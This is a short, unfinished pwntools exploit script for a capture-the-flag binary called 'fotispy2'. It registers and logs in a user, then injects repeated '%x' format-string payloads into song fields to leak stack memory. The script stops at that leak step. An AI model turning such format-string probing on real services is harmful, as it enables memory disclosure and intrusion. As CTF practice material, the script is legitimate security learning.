#!/usr/bin/env python3

from pwn import *

exe = ELF("fotispy2_patched", checksec = False)
libc = ELF("libc.so.6", checksec = False)
ld = ELF("ld-linux-x86-64.so.2", checksec = False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path], aslr=False)
else:
    p = remote("addr", 1337)


def regist(name, password):
    p.sendlineafter(b'[4]: ', b'0')
    p.sendlineafter(b'username: ', name)
    p.sendlineafter(b'password: ', password)

def login(name, password):
    p.sendlineafter(b'[4]: ', b'1')
    p.sendlineafter(b'username: ', name)
    p.sendlineafter(b'password: ', password)

input()
regist(b'a', b'a')
login(b'a', b'a')

# result++
p.sendlineafter(b'[4]: ', b'2')
p.sendlineafter(b'title: ', b'aaaaaaaa')
p.sendlineafter(b'from: ', b'aaaaaaaaaaaaaaaa')
p.sendlineafter(b'on: ', b'aaaaaaaaaaaaaaaa')

# luu vao a1 + 41688LL * (unsigned __int8)index + 2604LL * 0 + 16 + 4
p.sendlineafter(b'[4]: ', b'2')
payload = f'%x%x%x%x%x%x%x%x%x%x%x'.encode()
p.sendlineafter(b'title: ', payload)
p.sendlineafter(b'from: ', payload)
p.sendlineafter(b'on: ', payload)

p.sendlineafter(b'[4]: ', b'3')



p.interactive()
